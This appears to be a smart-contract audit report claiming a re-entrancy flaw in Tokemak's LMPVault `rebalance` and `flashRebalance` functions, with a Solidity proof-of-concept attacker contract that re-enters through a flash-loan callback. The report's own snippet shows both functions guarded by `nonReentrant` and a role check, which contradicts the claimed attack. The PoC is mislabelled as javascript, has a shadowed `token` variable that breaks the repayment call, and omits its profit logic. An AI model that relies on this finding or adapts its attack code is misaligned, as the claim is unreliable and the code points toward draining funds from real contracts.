# Re-entrancy hazard in `LMPVault.sol` facilitate risk of attacks via external calls due to delayed state updates in `rebalance` and `flashRebalance` methods
## Summary

The smart contract LMPVault.sol from Tokemak protocol has a potential vulnerability related to re-entrancy. In the `rebalance` and `flashRebalance` functions, the contract seems to allow external calls before updating the state variables `totalIdle` and `totalDebt`.

## Vulnerability Detail

The `rebalance` and `flashRebalance` functions involve interactions with external contracts (which could be malicious) before updating the `totalIdle` and `totalDebt` variables. This opens an eventual risk for re-entrancy attacks.

In particular, the `rebalance` function makes an external call to `LMPDebt.rebalance` which can further interact with other external contracts. Similarly, `flashRebalance` function calls `LMPDebt.flashRebalance` which could allow the receiver to initiate a re-entrancy attack.

## Impact

If exploited, this vulnerability can result in loss of funds. An attacker could repeatedly call the `rebalance` or `flashRebalance` function while the state variables `totalIdle` and `totalDebt` are still unaltered.

## Code Snippet

```solidity
function rebalance(RebalanceParams memory params) public nonReentrant hasRole(Roles.SOLVER_ROLE) trackNavOps {
 (uint256 idle, uint256 debt) = LMPDebt.rebalance(
 destinationInfo[params.destinationOut],
 destinationInfo[params.destinationIn],
 params,
 _baseAsset,
 _shutdown,
 totalIdle,
 totalDebt
 );
 totalIdle = idle;
 totalDebt = debt;
 _collectFees(idle, debt, totalSupply());
}

function flashRebalance(
 IERC3156FlashBorrower receiver,
 RebalanceParams memory rebalanceParams,
 bytes calldata data
 ) public nonReentrant hasRole(Roles.SOLVER_ROLE) trackNavOps {
 (uint256 idle, uint256 debt) = LMPDebt.flashRebalance(
 destinationInfo[rebalanceParams.destinationOut],
 destinationInfo[rebalanceParams.destinationIn],
 receiver,
 rebalanceParams,
 LMPDebt.FlashRebalanceParams({
 totalIdle: totalIdle,
 totalDebt: totalDebt,
 baseAsset: _baseAsset,
 shutdown: _shutdown
 }),
 data
 );
 totalIdle = idle;
 totalDebt = debt;
 _collectFees(idle, debt, totalSupply());
}
```

## Tool used

Manual Review

## Recommendation

The team should use the Checks-Effects-Interactions pattern in these functions. The state variables should be updated before making the external calls to avoid reentrancy exploit scenarios.

## Proof Of Concept

Here's a further comprehensive example demonstrating how an attacker might exploit the vulnerability, including the logic to repay the flash loan (plus the fee) and a basic draft scheme to profit from the vulnerability. 

> **Note that this is only an illustration and will not work directly against a mainnet fork without concrete contract addresses and parameters.**


```javascript
contract MaliciousContract is IERC3156FlashBorrower {
    LMPVault public victimContract;
    IERC20 public token;
    RebalanceParams public maliciousParams;
    bytes public maliciousData;
    uint256 public amountOwed;

    constructor(LMPVault _victimContract, IERC20 _token, RebalanceParams memory _maliciousParams, bytes memory _maliciousData) {
        victimContract = _victimContract;
        token = _token;
        maliciousParams = _maliciousParams;
        maliciousData = _maliciousData;
    }

    function executeAttack() external {
        victimContract.flashRebalance(this, maliciousParams, maliciousData);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external override returns(bytes32) {
        require(msg.sender == address(victimContract), "Only victim contract can initiate");

        amountOwed = amount + fee;
        
        // Re-enter the victim contract
        victimContract.flashRebalance(this, maliciousParams, maliciousData);
        
        // Profit logic goes here. This could involve a series of complex transactions
        // that eventually lead to the attacker profiting from the re-entrancy attack.
        // This logic has been omitted for simplicity.

        // Return the loan plus fee
        require(token.transfer(msg.sender, amountOwed), "Failed to repay loan");
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

In this contract, we first set up the victim contract, malicious parameters, and malicious data in the constructor. The `executeAttack` function is then called to initiate the flash loan from the victim contract. Since this contract implements `IERC3156FlashBorrower`, it is called back in the `onFlashLoan` function, where it calculates the amount owed (including the fee), calls `flashRebalance` again (initiating the re-entrancy attack), and then transfers the owed amount back to the lender (repaying the loan).

The actual logic of how the attacker would profit from the re-entrancy attack has been omitted for simplicity, but it would generally involve some form of arbitrage or manipulation of contract state to the attacker's benefit.
